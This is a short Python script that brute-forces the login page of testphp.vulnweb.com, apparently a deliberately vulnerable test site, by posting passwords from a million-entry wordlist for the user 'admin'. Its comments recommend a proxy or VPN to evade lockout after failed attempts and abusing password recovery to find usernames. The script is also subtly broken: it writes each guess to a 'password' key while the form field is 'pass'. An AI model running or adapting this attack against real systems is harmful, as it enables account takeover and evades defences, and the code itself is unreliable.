#!/usr/bin/env python3

import requests

target_url = "http://testphp.vulnweb.com/login.php"
# setup proxy or vpn to bypass failed attempts max
# find username first or email through lost my password and fill hashmap with parameters in post form
# dict params -> check form for input names
"""
example 
<input name="uname" type="text" size="20" style="width:120px;">
<input name="pass" type="password" size="20" style="width:120px;">
<input type="submit" value="login" style="width:75px;">
"""
data_dict = {"uname": "admin", "pass": "", "value": "submit"}


with open("/root/Downloads/10-million-password-list-top-1000000.txt") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content.decode('utf-8'):
            print("[+] Password found: " + word)
            exit()

print("[+] List exhausted")